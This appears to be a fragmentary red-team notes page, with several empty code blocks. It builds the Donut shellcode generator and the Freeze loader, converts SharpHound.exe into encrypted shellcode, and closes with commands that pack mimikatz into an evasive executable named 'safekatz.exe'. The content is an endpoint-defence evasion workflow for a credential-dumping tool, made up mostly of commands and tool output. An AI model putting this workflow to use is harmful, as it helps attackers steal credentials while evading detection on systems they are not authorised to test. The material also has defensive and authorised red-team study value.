- 
- [References](#references)

-------------------------------------------

## 
```sh
git clone https://github.com/TheWover/donut
cd donut
docker build -t donut .
docker run -it --rm -v "${PWD}:/workdir" donut -h
```

## 
```sh
# sudo apt install gccgo-go
# sudo apt install golang-go
git clone https://github.com/optiv/Freeze
cd Freeze

```

## 
```sh
$ docker run -it --rm -v "${PWD}:/workdir" donut -i SharpHound.exe 

  [ Donut shellcode generator v1 (built Dec 31 2023 07:39:42)
  [ Copyright (c) 2019-2021 TheWover, Odzhan

  [ Instance type : Embedded
  [ Module file   : "SharpHound.exe"
  [ Entropy       : Random names + Encryption
  [ File type     : .NET EXE
  [ Target CPU    : x86+amd64
  [ AMSI/WDLP/ETW : continue
  [ PE Headers    : overwrite
  [ Shellcode     : "loader.bin"
  [ Exit          : Thread
```

## 
```sh
$ l
total 4.9M
-rw-r--r-- 1 root root 1.2M Dec 31 15:49 loader.bin
-rw-r--r-- 1 kali kali 1.1M Dec 31 15:44 SharpHound.exe
```

## 
```sh

```

## 
```sh

```

## 
```sh

```

## 
```sh

```

## 
```sh

```

## 
```sh
./donut -i <Your mimikatz.exe location>
./Freeze -I ../loader.bin -O safekatz.exe
```

# [References](#references-1)

https://medium.com/@agonhysenaj/running-mimikatz-with-havoc-donut-and-freeze-6fd040deea01

https://github.com/optiv/Freeze